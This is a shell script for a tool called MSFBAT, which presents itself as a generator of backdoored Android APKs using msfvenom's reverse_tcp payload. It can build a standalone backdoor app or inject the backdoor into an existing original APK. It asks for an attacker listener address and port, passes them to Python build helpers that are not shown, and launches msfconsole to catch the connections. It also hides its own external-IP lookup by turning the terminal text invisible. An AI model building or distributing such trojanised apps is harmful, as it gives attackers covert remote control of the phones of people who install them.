# Msfbat
# A script that generates backdoor apk's with msfvenom with the reverse_tcp payload.
# 3.0
# Edvard Busck-Nielsen 2018

# Edvard Busck-Nelsen, hereby disclaims all copyright interest in the program “MSFBAT” (which is a script/tool that generates backdoor apk's with msfvenom with the reverse_tcp payload.  written by Edvard Busck-Nielsen.

# signature of Edvard Busck-Nelsen 18 April 2018
# Edvard Busck-Nielsen, @buscedv

# This file is part of MSFBAT

#    MSFBAT is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    MSFBAT is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with MSFBAT.  If not, see <http://www.gnu.org/licenses/>

# Website: http://msfbat.ml
# Contact: Github(Personal), https://github.com/Buscedv



# Initialization script...

# Startup Message

#Shows a startup message and sets the terminal text color to invisable to hide the get external ip command.
echo "\033[1m\033[0;31m[<MSFBAT Is Starting Up...>]\033[8m"

# Gets the users IP adress and saves it in a variable.
user_lip=$(hostname -I)
user_xip=$(curl ident.me)

echo "\033[0m" # Makes the font visable again.


# Setup
clear

# Gets menu parts to be ready for color.
menu=$(cat menu/menu.txt)
menu1=$(cat menu/menu_1.txt)
menu2=$(cat menu/menu_2.txt)
menu3=$(cat menu/menu_3.txt)

# Draws the different menu parts using echo and Escape colors.

# 	- 0) The ASCII Bat
echo "\033[0;32m$menu" # In Green.

# 	- 1) The ASCII Art Text/Header
echo "\033[0;31m$menu1" # In Red

echo "" #Spacer Line.
echo "" #Spacer Line.

# 	- 2) The About Text Block
echo "\033[1;30m$menu2" # In Dark Grey

echo "" #Spacer Line.
echo "" #Spacer Line.

# 	- 3) The About Text Block
echo "\033[1;33m$menu3" # In Yellow

echo "" #Spacer Line.
echo "\033[0;37m\033[1m" # Spacer Line With Color Adding (Purple) & Bold Font Styling For Next Command(s).

# User input on what action to take:

printf "   Choose Action (1-6): "
read -r action

echo "\033[0m" # Spacer Line + Removes The (Purple) Color For The Next command(s)

# If statement(s) to check what action to take:

if [ "$action" = "1" ]; then
	# ACTION :: Generate Backdoor APK.
	#clears the screen
	clear

	# Shows header with ASCII Text & Bat From File.

	# Creates header text with figlet and stores it in a variable.
	apk_header_text=$(figlet    Backdoor APK)

	apk_header=$(cat menu/header_bat1.txt)
	echo "\033[1m\033[0;32m $apk_header"
	echo "\033[0m"
	echo "\033[1m\033[0;31m$apk_header_text"
	echo "\033[2m\033[1;33m"
	echo "   #----------------------------------------#"
	echo "   | Your IP Address: "$user_lip"        |"
	echo "   |                                        |"
	echo "   | Your Ext. IP Address: "$user_xip"   |"
	echo "   #----------------------------------------#"
	echo ""
	echo "\033[1m\033[1;33m   Output APK File Name:\033[0;37m"
	echo ""
	read output_name
	echo ""
	echo "\033[1m\033[1;33m   LHOST:\033[0;37m"
	echo ""
	read lhost
	echo ""
	echo "\033[1m\033[1;33m   LPORT:\033[0;37m"
	echo ""
	read lport
	echo ""
	echo "\033[0;35m   [<Generating...>]\033[0m\033[0;37m\033[8m" # + Sets the terminal font color to invisable
	# changes to the output directory.
	cd output
	# Saves info to tmp textfiles for the python script
	rm temp/outn.txt
	touch temp/outn.txt
	echo "$output_name" >> temp/outn.txt
	# Creates temporary files that contains the users selected port and ip.
	rm temp/user_ip.txt
	touch temp/user_ip.txt
	echo "$lhost" >> temp/user_ip.txt

	rm temp/user_port.txt
	touch temp/user_port.txt
	echo "$lport" >> temp/user_port.txt
	# Runs the metasploit-framework command in a new xterm window via python.
	python build_apk.py
	# Changes one folder back.
	cd ..
	# clears the screen
	clear
	# Sets font back to 'normal'
	echo "\033[1m"
	echo "\033[0;35m   [<DONE!>]"
	echo ""
	echo "\033[0;35m   [<Saved As, output/"$output_name">]"
	echo ""
	echo "\033[1m\033[1;33m   Press Enter To Exit To Main Menu..."
	read rewd
	sh msfbat.sh
	exit

elif [ "$action" = "2" ]; then
	# ACTION :: Generate Backdoor APK From Original APK.
	#clears the screen
	clear

	# Shows header with ASCII Text & Bat From File.

	# Creates header text with figlet and stores it in a variable.
	apk_header_text=$(figlet    Original APK Backdoor)

	apk_header=$(cat menu/header_bat1.txt)
	echo "\033[1m\033[0;32m $apk_header"
	echo "\033[0m"
	echo "\033[1m\033[0;31m$apk_header_text"
	echo "\033[2m\033[1;33m"
	echo "   #----------------------------------------#"
	echo "   | Your IP Address: "$user_lip"        |"
	echo "   |                                        |"
	echo "   | Your Ext. IP Address: "$user_xip"   |"
	echo "   #----------------------------------------#"
	echo ""
	echo "\033[1m\033[1;33m   Original APK Name !With Path! :\033[0;37m"
	echo ""
	read template_name
	echo ""
	echo "\033[1m\033[1;33m   Output APK File Name !No Path! :\033[0;37m"
	echo ""
	read output_name
	echo ""
	echo "\033[1m\033[1;33m   LHOST:\033[0;37m"
	echo ""
	read lhost
	echo ""
	echo "\033[1m\033[1;33m   LPORT:\033[0;37m"
	echo ""
	read lport
	echo ""
	echo "\033[0;35m   [<Generating...>]\033[0m\033[0;37m" # + Sets the terminal font color to invisable
	# changes to the output directory.
	cd output
	# Saves info to tmp textfiles for the python script
	rm temp/outn.txt
	touch temp/outn.txt
	echo "$output_name" >> temp/outn.txt

	rm temp/inn.txt
	touch temp/inn.txt
	echo "$template_name" >> temp/inn.txt
	# Creates temporary files that contains the users selected port and ip.
	rm temp/user_ip.txt
	touch temp/user_ip.txt
	echo "$lhost" >> temp/user_ip.txt

	rm temp/user_port.txt
	touch temp/user_port.txt
	echo "$lport" >> temp/user_port.txt
	# Runs the metasploit-framework command in a new xterm window via python.
	python build_oapk.py
	# Changes one folder back.
	cd ..
	# clears the screen
	clear
	# Sets font back to 'normal'
	echo "\033[1m"
	echo "\033[0;35m   [<DONE!>]"
	echo ""
	echo "\033[0;35m   [<Saved As, output/"$output_name">]"
	echo ""
	echo "\033[1m\033[1;33m   Press Enter To Exit To Main Menu..."
	read rewd
	sh msfbat.sh
	exit

elif [ "$action" = "3" ]; then
	# ACTION :: Launch MSFCONSOLE.
	# Launches the msfconsole in a new xterm window + some useful information.
	xterm -title "MSFBAT msfconsole" -e msfconsole
	# clears the screen
	clear
	# Gets small ASCII Art Bat and draws it on the screen.
	sml_bat=$(cat menu/small_bat.txt)
	echo "\033[0;32m$sml_bat"
	echo "\033[0;35m   [<DONE!>]"
	echo ""
	echo "\033[1m\033[1;33m   Press Enter To Exit To Main Menu..."
	read rewd
	sh msfbat.sh
	exit


elif [ "$action" = "4" ]; then
	# ACTION :: Help.
	# clears the screen
	clear
	# shows a textfile with useful info & help pages.
	HELPTEXT=$(cat menu/help.txt)
	echo "\033[1m\033[0;32m$HELPTEXT"
	echo ""
	echo "\033[1m\033[1;33m   Open Web Page/Exit To Main Menu? [ o/x ]..."
	echo ""
	read rewd
	if [ "$rewd" = "x" ]; then		
		sh msfbat.sh
		exit
	elif [ "$rewd" = "o" ]; then
		w3m http://msfbat.ml/t/help
		clear
	fi
	echo "\033[1m\033[1;33m   Press Enter To Exit To Main Menu..."
	read rewd
	sh msfbat.sh
	exit


elif [ "$action" = "5" ]; then
	# ACTION :: Credits.
	# clears the screen
	clear
	# Credits from text file
	echo "\033[0;32m$(cat menu/credits.txt)" # In Green

	echo "" #Spacer Line.
	echo "" #Spacer Line.
	echo "\033[1m\033[1;33m   Press Enter To Exit To Main Menu..."
	read rewd
	sh msfbat.sh
	exit

elif [ "$action" = "6" ]; then
	# ACTION :: Exit.

	# Exits the script/program.
	
	# clears the screen
	clear

	# Removes temporary files.
	cd temp
	rm user_ip.txt
	rm user_port.txt
	cd ..
	clear

	# Informs User:
	echo "\033[1m\033[0;31m   [<Exiting MSFBAT>] *"
	# Fake Loading 'Animation'
	sleep 0.5
	clear
	echo "   [<Exiting MSFBAT>] * *"
	sleep 0.5
	clear
	echo "   [<Exiting MSFBAT>] * * *"
	sleep 0.5
	clear
	echo "   [<Exiting MSFBAT>] *"
	sleep 0.5
	clear
	# Gets small ASCII Art Bat and draws it on the screen.
	sml_bat=$(cat menu/small_bat.txt)
	echo "\033[0;32m$sml_bat"
	echo "\033[0;31m   [<DONE>]\033[0m"
	echo ""
	# exits.
	exit
fi